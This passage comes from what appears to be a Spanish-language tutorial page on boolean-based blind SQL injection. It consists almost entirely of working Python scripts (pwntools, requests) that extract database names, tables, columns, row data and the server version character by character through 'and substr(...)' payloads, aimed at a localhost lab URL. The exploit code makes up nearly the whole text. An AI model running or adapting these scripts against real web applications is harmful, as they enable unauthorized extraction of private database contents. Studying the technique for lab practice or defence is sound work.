</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>database</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>,</span><span class=n>mensaje</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Bases de datos&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>database</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and (select count(schema_name) from information_schema.schemata)=</span><span class=si>{}</span><span class=s2>-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dbs</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>db</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>dbs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and LENGTH((select schema_name from information_schema.schemata limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>db</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>db_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>database</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>db_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and substr((select schema_name from information_schema.schemata limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>db</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>database</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>database</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>database</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>,</span><span class=n>mensaje</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=tablas>Tablas</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span>
</span></span><span class=line><span class=cl><span class=n>mensaje</span> <span class=o>=</span> <span class=s2>&#34;Nombre: Joan&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tables</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Tablas&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>tables</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and (select count(table_name) from information_schema.tables where table_schema = &#39;my_database&#39;)=</span><span class=si>{}</span><span class=s2>-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tbs</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>tb</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>tbs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and LENGTH((select table_name from information_schema.tables where table_schema = &#39;my_database&#39; limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>tb</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>tb_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>tables</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>tb_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and substr((select table_name from information_schema.tables where table_schema = &#39;my_database&#39; limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>tb</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>tables</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>tables</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>tables</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=columnas-1>Columnas</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span>
</span></span><span class=line><span class=cl><span class=n>mensaje</span> <span class=o>=</span> <span class=s2>&#34;Nombre: Joan&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>columns</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Columnas&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>columns</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and (select count(column_name) from information_schema.columns where table_schema = &#39;my_database&#39; and table_name = &#39;mi_tabla&#39;)=</span><span class=si>{}</span><span class=s2>-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>cols</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>col</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>cols</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and LENGTH((select column_name from information_schema.columns where table_schema = &#39;my_database&#39; and table_name = &#39;mi_tabla&#39; limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>col</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>col_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>columns</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>col_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and substr((select column_name from information_schema.columns where table_schema = &#39;my_database&#39; and table_name = &#39;mi_tabla&#39; limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>col</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>columns</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>columns</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>columns</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=data-1>Data</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span> <span class=o>+</span> <span class=s2>&#34;:&#34;</span>
</span></span><span class=line><span class=cl><span class=n>mensaje</span> <span class=o>=</span> <span class=s2>&#34;Nombre: Joan&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>data</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Datos&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>datos</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and (select count(nombre) from my_database.mi_tabla)=</span><span class=si>{}</span><span class=s2>-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dts</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>dt</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>dts</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and LENGTH((select nombre from my_database.mi_tabla limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>dt</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>dt_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>datos</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>dt_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and substr((select nombre from my_database.mi_tabla limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>dt</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>datos</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>datos</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>data</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=mas-información-relevante>Mas información relevante</h3><details><summary>version() [Versión Base de datos]</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=k>version</span><span class=p>();</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span> <span class=o>+</span> <span class=s2>&#34;:&#34;</span>
</span></span><span class=line><span class=cl><span class=n>mensaje</span> <span class=o>=</span> <span class=s2>&#34;Nombre: Joan&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>version</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Datos&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>versions</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>v</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and LENGTH((select version() limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>v</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>mensaje</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>v_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>versions</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>v_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
